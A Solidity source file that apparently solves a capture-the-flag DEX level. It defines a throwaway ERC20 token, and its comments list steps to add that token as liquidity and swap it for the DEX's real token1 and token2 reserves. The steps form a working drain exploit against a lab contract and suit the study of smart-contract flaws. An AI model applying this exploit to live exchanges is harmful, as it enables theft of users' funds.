// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
// import "@openzeppelin/contracts/access/Ownable.sol";

contract DexHack is ERC20/*, Ownable*/ {

    constructor() ERC20("DexHack", "hak") {
        _mint(msg.sender, 1000 * 10 ** decimals());
    }
}


//0xe8762FE51789c7Bc6D56bEfedF8c8616514815FD
//await contract.approve(contract.address, 1000)

//const token1 = await contract.token1();
//const token2 = await contract.token2();
//const token3 = '<contract address>';

//approve the dex first before adding liquidity
//if add liquidity didn't work send the tokens directly from the token itself
//await contract.add_liquidity(token3, 100);
//await contract.swap(token3, token1, 100);
//await contract.swap(token3, token2, 200);